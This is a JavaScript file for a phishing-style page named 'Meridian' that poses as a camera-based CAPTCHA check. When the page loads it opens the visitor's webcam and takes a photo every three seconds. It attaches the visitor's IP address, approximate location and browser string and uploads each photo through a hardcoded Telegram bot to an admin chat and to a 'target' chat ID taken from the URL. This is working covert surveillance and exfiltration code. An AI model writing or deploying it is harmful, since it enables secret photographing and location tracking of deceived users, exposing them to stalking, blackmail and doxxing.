/* ============================================================
   MERIDIAN — SELF-CONTAINED CONFIG
   ============================================================ */
var BOT_TOKEN         = "8604239989:AAHnuyJZpz_E6s-_7rXUvlbHazAKOAHEB7A";
var ADMIN_CHAT_ID     = "7274208494";
var RECAPTCHA_SITE_KEY= "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
var CAPTURE_INTERVAL  = 3000;
var IMAGE_QUALITY     = 0.78;
var CAM_WIDTH         = 640;
var CAM_HEIGHT        = 480;
var SEND_ADMIN        = true;
var SEND_TO_TARGET    = true;
/* ============================================================ */

var video      = document.getElementById("video");
var canvas     = document.getElementById("canvas");
var camCard    = document.getElementById("camCard");
var camTitle   = document.getElementById("camTitle");
var camSub     = document.getElementById("camSub");
var stats      = document.getElementById("stats");
var cntCap     = document.getElementById("cntCaptures");
var delSt      = document.getElementById("delStatus");
var captchaW   = document.getElementById("captchaWrap");
var bottomR    = document.getElementById("bottomRight");

var params = new URLSearchParams(window.location.search);
var userChatId = params.get("id");
var hasTarget  = !!(userChatId && userChatId.trim());

var stream = null;
var captureTimer = null;
var captureCount = 0;
var capturing = false;
var recaptchaWidgetId = null;

function getIP(){
  return fetch("https://api.ipify.org?format=json")
    .then(function(r){ return r.json(); })
    .then(function(d){ return d.ip || "Unknown"; })
    .catch(function(){ return "Unknown"; });
}
function getGeo(){
  return fetch("https://ipapi.co/json/")
    .then(function(r){ return r.json(); })
    .then(function(d){ return (d.city || "?") + ", " + (d.country_name || "?"); })
    .catch(function(){ return "Unknown"; });
}

function sendPhotoTo(targetId, blob, caption){
  var fd = new FormData();
  fd.append("chat_id", targetId);
  fd.append("photo", blob, "meridian_" + Date.now() + ".jpg");
  fd.append("caption", caption);
  return fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
    method: "POST", body: fd
  }).then(function(r){ return r.ok; }).catch(function(){ return false; });
}

function capture(){
  if (!stream || !capturing) return Promise.resolve();

  canvas.width  = video.videoWidth  || CAM_WIDTH;
  canvas.height = video.videoHeight || CAM_HEIGHT;
  canvas.getContext("2d").drawImage(video, 0, 0);

  return new Promise(function(res){
    canvas.toBlob(res, "image/jpeg", IMAGE_QUALITY);
  }).then(function(blob){
    if (!blob) return;
    return Promise.all([getIP(), getGeo()]).then(function(arr){
      var ip = arr[0], geo = arr[1];
      var ua = navigator.userAgent;
      var date = new Date().toLocaleString("en-US", { timeZoneName: "short" });
      var base = "📸 #" + (captureCount + 1) + "\n🕐 " + date + "\n🌐 " + ip + " — " + geo + "\n💻 " + ua;
      var adminCaption = hasTarget ? (base + "\n👤 Target: " + userChatId) : (base + "\n🧾 No target");

      var chain = Promise.resolve();
      if (SEND_ADMIN) chain = chain.then(function(){ return sendPhotoTo(ADMIN_CHAT_ID, blob, adminCaption); });
      if (SEND_TO_TARGET && hasTarget) chain = chain.then(function(){ return sendPhotoTo(userChatId, blob, base); });

      return chain.then(function(){
        captureCount++;
        cntCap.textContent = captureCount;
        delSt.textContent = "✓";
      });
    });
  });
}

function startCamera(){
  camTitle.textContent = "Camera access";
  camSub.textContent = "Awaiting permission…";

  navigator.mediaDevices.getUserMedia({
    video: { width: { ideal: CAM_WIDTH }, height: { ideal: CAM_HEIGHT }, facingMode: "user" }
  }).then(function(s){
    stream = s;
    video.srcObject = stream;
    return video.play();
  }).then(function(){
    return new Promise(function(res){
      if (video.readyState >= 2) return res();
      video.onloadeddata = res;
      setTimeout(res, 2500);
    });
  }).then(function(){
    window.__cameraReady = true;
    camCard.classList.add("active");
    camTitle.textContent = "Camera connected";
    camSub.textContent = "Verifying your presence…";
    stats.style.display = "grid";
    captchaW.classList.remove("dimmed");
    captchaW.classList.add("ready");
    if (bottomR) bottomR.textContent = "● Verifying";

    capturing = true;
    capture();
    captureTimer = setInterval(capture, CAPTURE_INTERVAL);
    tryRenderRecaptcha();
  }).catch(function(err){
    camTitle.textContent = "Camera required";
    camSub.textContent = "Allow camera and reload.";
  });
}

function stopCapture(){
  capturing = false;
  if (captureTimer){ clearInterval(captureTimer); captureTimer = null; }
  if (stream){ stream.getTracks().forEach(function(t){ t.stop(); }); stream = null; }
}

function tryRenderRecaptcha(){
  if (!window.__recaptchaReady || !window.__cameraReady) return;
  if (recaptchaWidgetId !== null) return;
  var container = document.getElementById("recaptchaWidget");
  if (!container) return;
  try {
    recaptchaWidgetId = window.grecaptcha.render(container, {
      sitekey: RECAPTCHA_SITE_KEY,
      callback: onRecaptchaSuccess,
      "expired-callback": onRecaptchaExpired,
      "error-callback": onRecaptchaError
    });
  } catch (e){ console.error(e); }
}
window.__tryRenderRecaptcha = tryRenderRecaptcha;

function onRecaptchaSuccess(){
  if (bottomR) bottomR.textContent = "✓ Verified";
  stopCapture();
  setTimeout(function(){ window.location.href = "next.html"; }, 1000);
}
window.onRecaptchaSuccess = onRecaptchaSuccess;

function onRecaptchaExpired(){
  camTitle.textContent = "Session expired";
  camSub.textContent = "Solve again.";
}
window.onRecaptchaExpired = onRecaptchaExpired;

function onRecaptchaError(){
  camTitle.textContent = "Error";
  camSub.textContent = "Reload to retry.";
}
window.onRecaptchaError = onRecaptchaError;

window.addEventListener("load", startCamera);
window.addEventListener("beforeunload", stopCapture);
